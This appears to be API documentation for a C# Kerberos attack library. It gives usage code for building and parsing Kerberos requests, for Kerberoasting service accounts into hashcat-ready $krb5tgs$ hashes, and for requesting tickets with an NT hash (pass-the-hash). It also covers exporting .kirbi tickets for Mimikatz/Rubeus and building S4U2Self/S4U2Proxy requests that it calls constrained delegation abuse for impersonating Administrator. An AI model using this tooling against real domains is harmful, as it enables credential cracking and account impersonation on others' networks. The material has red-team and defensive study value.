# Kerberos

Kerberos protocol tooling — frame builders, ticket parsers, key derivation, and delegation helpers. The network methods (`RequestTgtAsync`, `RequestServiceTicketAsync`, `RequestServiceTicketWithHashAsync`) are stubs that return `null`; you wire them up by sending the byte arrays from `BuildAsReq` / `BuildTgsReq` over a TCP or UDP socket to port 88 and feeding the response into `ParseAsRep` / `ParseTgsRep`.

Everything else — frame construction, key derivation, kirbi encoding, hash formatting — is fully implemented.

---

## Types

### `KerberosEncryptionType`

Encryption types used in ticket requests and key derivation.

| Value | Constant | Description |
|---|---|---|
| 18 | `Aes256CtsHmacSha196` | AES-256 with CTS and HMAC-SHA1-96. Preferred on modern domains. |
| 17 | `Aes128CtsHmacSha196` | AES-128 variant. |
| 23 | `Rc4Hmac` | RC4-HMAC. Legacy, still common for Kerberoasting. |
| 24 | `Rc4HmacExp` | RC4-HMAC export variant. |
| 3 | `DesCbcMd5` | DES-CBC-MD5. Disabled by default on anything past 2008. |

---

### `KerberosTicket`

Represents a parsed or constructed Kerberos ticket. All properties are `init`-only.

| Property | Type | Description |
|---|---|---|
| `Realm` | `string` | The Kerberos realm, e.g. `CORP.LOCAL`. |
| `ServiceName` | `string` | SPN of the service this ticket was issued for. |
| `ClientName` | `string` | The principal who requested the ticket. |
| `EncryptedTicket` | `byte[]` | The raw encrypted ticket blob. |
| `AuthTime` | `DateTime` | When the KDC authenticated the client. |
| `StartTime` | `DateTime` | When the ticket becomes valid. |
| `EndTime` | `DateTime` | Ticket expiry. |
| `RenewTill` | `DateTime` | Renewal deadline if the renewable flag is set. |
| `EncryptionType` | `KerberosEncryptionType` | Encryption type used for the session key. |
| `Flags` | `uint` | Ticket flags bitmask. |
| `SessionKey` | `byte[]` | The session key for this ticket. |

---

### `KerberosOptions`

Configuration passed to all network and frame-building methods.

| Property | Type | Default | Description |
|---|---|---|---|
| `DomainController` | `string` | `""` | Hostname or IP of the KDC. |
| `Port` | `int` | `88` | KDC port. |
| `Timeout` | `TimeSpan` | 30s | Network timeout. |
| `UseUdp` | `bool` | `false` | Use UDP instead of TCP. |
| `SupportedEncTypes` | `KerberosEncryptionType[]` | AES-256, AES-128, RC4 | Advertised enc types in the request body. |

---

## Frame Builders

### `BuildAsReq(string username, string realm, KerberosOptions options)`

Builds a raw AS-REQ byte array for the given user and realm. The returned bytes are ready to be sent to the KDC over TCP (prepend a 4-byte big-endian length) or UDP (send as-is).

```csharp
var opts = new KerberosOptions { DomainController = "dc01.corp.local" };
var asReq = Kerberos.BuildAsReq("jsmith", "CORP.LOCAL", opts);

// Send over TCP
using var tcp = new TcpClient("dc01.corp.local", 88);
var stream = tcp.GetStream();
var lenPrefix = BitConverter.GetBytes(IPAddress.HostToNetworkOrder(asReq.Length));
await stream.WriteAsync(lenPrefix);
await stream.WriteAsync(asReq);
```

---

### `BuildTgsReq(KerberosTicket tgt, string servicePrincipal, KerberosOptions options)`

Builds a TGS-REQ using an existing TGT and a target SPN. Use this after you have a TGT to request a service ticket.

```csharp
var tgsReq = Kerberos.BuildTgsReq(tgt, "MSSQLSvc/sql01.corp.local:1433", opts);
```

---

### `BuildApReq(KerberosTicket ticket, byte[] authenticator)`

Builds an AP-REQ from a service ticket and a pre-built authenticator. This is what gets sent to the actual service (not the KDC) to prove identity.

```csharp
var authenticator = BuildAuthenticator(ticket.SessionKey); // your own construction
var apReq = Kerberos.BuildApReq(serviceTicket, authenticator);
```

---

## Network Methods (stubs)

These methods currently return `null`. They're the place to plug in your KDC transport layer.

### `RequestTgtAsync(string username, string password, string realm, KerberosOptions options, CancellationToken ct)`

Intended to perform a full AS exchange — send AS-REQ, receive AS-REP, decrypt the enc-part with the derived key, return a `KerberosTicket`.

```csharp
var tgt = await Kerberos.RequestTgtAsync("jsmith", "P@ssw0rd1", "CORP.LOCAL", opts);
// currently returns null — wire up BuildAsReq + TCP send/receive + ParseAsRep
```

---

### `RequestServiceTicketAsync(KerberosTicket tgt, string spn, KerberosOptions options, CancellationToken ct)`

Intended to perform a TGS exchange using an existing TGT.

```csharp
var ticket = await Kerberos.RequestServiceTicketAsync(tgt, "http/web01.corp.local", opts);
```

---

### `RequestServiceTicketWithHashAsync(string username, byte[] ntHash, string realm, string spn, KerberosOptions options, CancellationToken ct)`

Same as above but authenticates with an NT hash instead of a plaintext password. Pass-the-hash style.

```csharp
var ntHash = Convert.FromHexString("aad3b435b51404eeaad3b435b51404ee");
var ticket = await Kerberos.RequestServiceTicketWithHashAsync("jsmith", ntHash, "CORP.LOCAL", "cifs/fs01.corp.local", opts);
```

---

## Parsers

### `ParseAsRep(ReadOnlySpan<byte> data)`

Parses an AS-REP response from the KDC. Returns `null` if the first byte doesn't match the AS-REP message type (`0x0B`).

```csharp
var asRep = await ReceiveKdcResponse(stream);
var ticket = Kerberos.ParseAsRep(asRep);
```

---

### `ParseTgsRep(ReadOnlySpan<byte> data)`

Parses a TGS-REP response. Returns `null` if the message type byte doesn't match (`0x0D`).

```csharp
var tgsRep = await ReceiveKdcResponse(stream);
var serviceTicket = Kerberos.ParseTgsRep(tgsRep);
```

---

## Kirbi Encoding

### `EncodeKirbiTicket(KerberosTicket ticket)`

Serializes a `KerberosTicket` into the kirbi format (`.kirbi` files used by Mimikatz / Rubeus). The output starts with `0x76 0x82`.

```csharp
var kirbi = Kerberos.EncodeKirbiTicket(ticket);
File.WriteAllBytes("ticket.kirbi", kirbi);
```

---

### `DecodeKirbiTicket(ReadOnlySpan<byte> data)`

Parses kirbi-formatted bytes back into a `KerberosTicket`. Returns `null` if the magic bytes aren't present.

```csharp
var kirbiBytes = File.ReadAllBytes("ticket.kirbi");
var ticket = Kerberos.DecodeKirbiTicket(kirbiBytes);
```

---

## Key Derivation

### `DeriveKey(string password, string salt, KerberosEncryptionType encType, int iterations)`

Derives a Kerberos encryption key from a password and salt using the appropriate algorithm for the given enc type. Default iteration count is 4096 (RFC 3962 minimum for AES).

Salt format for AES is `REALM + username` (uppercase realm, case-sensitive username). RC4 ignores the salt.

```csharp
// AES-256 key for jsmith in CORP.LOCAL
var aesKey = Kerberos.DeriveKey("P@ssw0rd1", "CORP.LOCALjsmith", KerberosEncryptionType.Aes256CtsHmacSha196);

// RC4/NTLM key (salt ignored)
var rc4Key = Kerberos.DeriveKey("P@ssw0rd1", "", KerberosEncryptionType.Rc4Hmac);
```

---

## Kerberoasting

### `Kerberoast(string spn, KerberosTicket tgt, KerberosOptions options, string outputPath, CancellationToken ct)`

Requests a service ticket for the given SPN using the provided TGT, formats the encrypted portion as a hashcat-compatible `$krb5tgs$` hash, and writes it to `outputPath`. Returns `true` on success.

```csharp
var success = await Kerberos.Kerberoast("MSSQLSvc/sql01.corp.local:1433", tgt, opts, "hashes.txt");
```

---

### `FormatKerberoastHash(KerberosTicket ticket)`

Takes an already-obtained service ticket and formats it as a `$krb5tgs$` hash string without doing any network operations. Use this if you've already got the ticket and just need the hash format.

```csharp
var hash = Kerberos.FormatKerberoastHash(serviceTicket);
// $krb5tgs$23$*jsmith$CORP.LOCAL$MSSQLSvc/sql01.corp.local:1433*$a3f1...
File.WriteAllText("hash.txt", hash);
```

The output is directly usable with hashcat mode 13100 or john with `krb5tgs` format.

---

## Delegation

### `BuildS4U2SelfReq(KerberosTicket tgt, string targetUser, KerberosOptions options)`

Builds an S4U2Self TGS-REQ. Used when a service needs to obtain a ticket on behalf of a user without that user's credentials — the first step in constrained delegation abuse.

```csharp
var s4uSelf = Kerberos.BuildS4U2SelfReq(serviceTgt, "Administrator", opts);
// send s4uSelf to KDC port 88, parse response as TGS-REP
```

---

### `BuildS4U2ProxyReq(KerberosTicket s4u2selfTicket, KerberosTicket tgt, string targetSpn, KerberosOptions options)`

Builds an S4U2Proxy TGS-REQ using the ticket obtained from S4U2Self. This produces a service ticket for `targetSpn` that impersonates the user from the S4U2Self exchange.

```csharp
var s4uProxy = Kerberos.BuildS4U2ProxyReq(selfTicket, serviceTgt, "cifs/fs01.corp.local", opts);
// send to KDC, parse TGS-REP — the resulting ticket can be used as the impersonated user
```

---

## Utility

### `GetCurrentUserSpn()`

Returns the current Windows identity name using `WindowsIdentity.GetCurrent()`. Returns an empty string if the call fails or you're not on Windows.

```csharp
var spn = Kerberos.GetCurrentUserSpn();
Console.WriteLine(spn); // CORP\jsmith
```
